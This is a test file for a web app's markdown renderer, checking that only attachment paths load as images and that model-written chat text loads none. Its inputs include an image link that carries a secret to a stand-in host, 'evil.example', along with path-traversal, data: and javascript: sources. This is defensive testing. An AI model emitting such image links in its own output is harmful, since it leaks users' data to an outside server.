// How markdown renders (src/web/markdown.tsx): only attachments load as images; any other image is a link, and text a
// model wrote (the chat panel's `images={false}`) loads no image at all. Like editor.test.ts it imports src/, on happy-dom.
import { afterAll, expect, test } from "bun:test";
import { Window } from "happy-dom";

const dom = new Window({ url: "http://localhost/acme" });
const added = Object.getOwnPropertyNames(dom).filter((key) => !(key in globalThis));
for (const key of added) (globalThis as any)[key] = (dom as any)[key];
(globalThis as any).window = dom;
added.push("window");
afterAll(async () => {
  await Bun.sleep(50); // React's scheduled work after the last render still reads window
  for (const key of added) delete (globalThis as any)[key];
  await dom.happyDOM.close();
});

const { createElement } = await import("react");
const { flushSync } = await import("react-dom");
const { createRoot } = await import("react-dom/client");
const { AppContext } = await import("../src/web/context.ts");
const { Markdown } = await import("../src/web/markdown.tsx");

/** The HTML Markdown renders for `text`, in a workspace with no teams or members. */
function render(text: string, images?: boolean): string {
  const host = document.createElement("div");
  const root = createRoot(host);
  const app = { teams: [], members: [], workspace: null } as never;
  flushSync(() => root.render(createElement(AppContext.Provider, { value: app }, createElement(Markdown, { text, images }))));
  const html = host.innerHTML;
  root.unmount();
  return html;
}

const SHOT = "/api/attachments/AttachmentFixture00001/shot.png";

test("attachments load as images; remote images are links that load nothing", () => {
  const html = render(`![shot](${SHOT}) ![leak](https://evil.example/x.png?d=secret) ![](https://evil.example/y.png)`);
  expect(html).toContain(`<img src="${SHOT}" alt="shot" loading="lazy">`);
  expect(html.match(/<img /g)).toHaveLength(1);
  expect(html).toContain('<a href="https://evil.example/x.png?d=secret" target="_blank" rel="noopener noreferrer">leak</a>');
  expect(html).toContain('<a href="https://evil.example/y.png" target="_blank" rel="noopener noreferrer">https://evil.example/y.png</a>');
  // Paths that only look like attachments, or data: and javascript: images, never load.
  for (const src of ["/api/attachments/../../x.png", "/api/attachments/short/x.png", "//evil.example/api/attachments/AttachmentFixture00001/x", "data:image/png;base64,AAAA", "javascript:alert(1)"]) {
    expect([src, render(`![x](${src})`)]).toEqual([src, expect.not.stringContaining("<img")]);
  }
});

test("attachment links open in a new tab, not in the app", () => {
  const html = render("[build.log](/api/attachments/AttachmentFixture00002/build.log) [doc](/doc/plan)");
  expect(html).toContain('<a href="/api/attachments/AttachmentFixture00002/build.log" target="_blank" rel="noopener noreferrer">build.log</a>');
  expect(html).toMatch(/<a href="[^"]*\/doc\/plan">doc<\/a>/);
});

test("text a model wrote (the chat panel) loads no image, not even an attachment", () => {
  const html = render(`![shot](${SHOT}) ![leak](https://evil.example/x.png?d=secret)`, false);
  expect(html).not.toContain("<img");
  expect(html).not.toContain("evil.example");
  expect(html).toContain("shot");
});
